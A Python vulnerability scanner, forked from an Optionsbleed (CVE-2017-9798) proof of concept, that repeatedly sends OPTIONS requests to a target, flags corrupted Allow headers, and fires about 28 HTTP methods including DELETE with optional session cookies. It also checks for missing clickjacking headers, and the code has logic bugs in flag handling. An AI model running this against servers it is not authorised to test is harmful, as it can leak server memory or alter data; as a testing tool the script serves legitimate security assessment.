#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Optionsbleed proof of concept test by Hanno BÃ¶ck
#
#
# Modified by MickCue(GitHub) | Forked - Added cookie support, changed to use requests and HTTP method test

import argparse
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os


# proxy = 'http://localhost:8080'

# os.environ['http_proxy'] = proxy 
# os.environ['HTTP_PROXY'] = proxy
# os.environ['https_proxy'] = proxy
# os.environ['HTTPS_PROXY'] = proxy

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#{major}.{minor}.{patch}
__version__ = '0.3'
logo = """
 __  __ ___  __      __ __     __ __ __             
/  \|__) | |/  \|\ |(_ |__)|  |_ |_ |  \   _|_  _|_ 
\__/|    | |\__/| \|__)|__)|__|__|__|__/    |    |  

"""+__version__+"""
"""


session = ""
user_agent = {'User-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'}
http_methods = ["DELETE","TRACE","TRACK","CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE",
"LOCK","UNLOCK","VERSION-CONTROL","REPORT","CHECKOUT","CHECKIN","UNCHECKOUT","MKWORKSPACE","UPDATE","LABEL",
"MERGE","BASELINE-CONTROL","OPTIONS","MKACTIVITY","ORDERPATCH","ACL","PATCH","SEARCH","ARBITRARY"]
fail = []
clickjacking_flag  = False
http_methods_flag = False
optionsbleed_flag = False


def summary():
    print("********************************")
    print("Summary of findings for '"+args.hosttocheck+"'")
    print("")     
    if clickjacking_flag == True:
        print("+ Clickjacking")
    if http_methods_flag == True:
        if len(fail) > 1:
            print("+ HTTP Methods (Found "+str(len(fail))+" vulnerable methods)")
        else:
            print("+ HTTP Methods (Found "+str(len(fail))+" vulnerable method)")
    if optionsbleed_flag == True:
        print("+ Optionsbleed")
    elif clickjacking_flag != True and http_methods_flag != True and optionsbleed_flag != True:
        print("No issues found")

def sortCookie(c):
    pair_list = c.split(";")
    cookie = []
    dic = {}
    for pair in pair_list:
        x = pair.split("=")
        dic[str(x[0])] = str(x[1])

    return (dic)

def test_methods(url, args):
    global clickjacking_flag
    global http_methods_flag
    global optionsbleed_flag
   

    if args.cookie:
        count = 0
        count_down = 0
        for h in http_methods:
            count += 1
        #count_down = count
        session = args.cookie
        for method in http_methods:
            cookies = sortCookie(args.cookie)
            #cookies = {'enwiki_session': '17ab96bd8ffbe8ca58a78657a918558', 'gdg': 'gfgd'}
            req = requests.request(method.lower(), args.hosttocheck, cookies=cookies,  verify=False)
            #{'example_cookie_name': 'example_cookie_value'}

            if dict(req.headers).get("x-frame-options") is None and req.status_code == 200: # Clickjacking check
                clickjacking_flag = True

            if req.status_code == 200 and req.content:
                fail.append(method.lower())


            percentage_completed = ( count_down / count * 100 / 1 )
            print(str(round(percentage_completed))+"% completed:"+method)
            count_down += 1


    else:
        count = 0
        count_down = 0
        for h in http_methods:
            count += 1


        for method in http_methods:
            req = requests.request(method.lower(), args.hosttocheck, verify=False)
            if dict(req.headers).get("x-frame-options") is None and req.status_code == 200: # Clickjacking check
                clickjacking_flag = True
            if req.status_code == 200:
                fail.append(method.lower())

            percentage_completed = ( count_down / count * 100 / 1 )
            print(str(round(percentage_completed))+"% completed:"+str(method))
            count_down += 1


    if fail:
        http_methods_flag = True
        print("********************************")
        print("Application is vulnerable to the following methods...")
        print("")
        
        for bad_method in fail:
            print("Method: "+bad_method)


def test_bleed(url, args):



    if args.cookie:
        session = args.cookie


        r = requests.request("options", args.hosttocheck, cookies={''+session.split('=')[0]+'':''+session.split('=')[1]+''},  verify=False)


    else:
        r = requests.request("options", args.hosttocheck, verify=False)



    raw_headers = r.headers
    allow= ""


    for a in raw_headers:

        if "Allow" in a:
            allow = r.headers['allow']


    if allow == "":
        print("[empty] %s" % (url))
        return False
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
        
        z = [x.strip() for x in allow.split(',')]
        if len(z) > len(set(z)):
            print("[duplicates] %s: %s" % (url, repr(allow)))
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
        #else:
            #print("[No Issues]")

    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
        optionsbleed_flag = True
    return True

print(logo+"\n")
parser = argparse.ArgumentParser(
         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\n\n"
         "Explanation of results:\n"
         "[bleed] corrupted header found, vulnerable\n"
         "[empty] empty allow header, does not make sense\n"
         "[spaces] space-separated method list (should be comma-separated)\n"
         "[duplicates] duplicates in list (may be apache bug 61207)\n"
         "[ok] normal list found (only shown with -a/--all)\n",
         formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('hosttocheck',  action='store',
                    help='The hostname you want to test against')
parser.add_argument('-n', nargs=1, type=int, default=[10],
                    help='number of tests (default 10)')
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action='store_true',
                    help="pass URL instead of hostname")
parser.add_argument("-c", "--cookie", help="add Cookie")
parser.add_argument("-m", "--methods", help="Test for malicious HTTP methods", action="store_true")


args = parser.parse_args()
howoften = int(args.n[0])


if args.url:

    if args.methods:
        print("********************************")
        print("Testing HTTP Methods")
        print("")
        
        test_methods(args.url, args)

    for x in range(0, 1):
        print("")
    print("********************************")
    print("Testing OPTIONSBLEED\n")


    for i in range(howoften):        
            try:
                if test_bleed(args.url, args) is False:
                    break

            except Exception as e:
                pass

    summary()


else:
    for x in range(0, 5):
        print("")
    print("Error")
    print("Example: optionsbleed -u https://example.com -c session=1234 -m")
